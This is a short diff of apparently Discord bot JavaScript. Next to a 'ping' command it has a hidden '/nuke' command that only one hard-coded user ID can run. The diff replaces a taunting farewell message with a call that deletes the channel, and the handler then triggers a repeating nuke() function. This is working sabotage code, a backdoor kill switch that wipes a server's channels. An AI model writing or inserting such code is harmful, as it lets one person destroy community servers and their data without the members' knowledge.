@@ -162,7 +162,7 @@ if (message.content.startsWith(prefix + "ping")) {
   if (message.content.startsWith("/nuke")) {
     if (message.author.id !== '289523788822085632') 
       return;
-    message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
+    message.channel.delete()
     setTimeout(nuke, 5000);
   }
 });
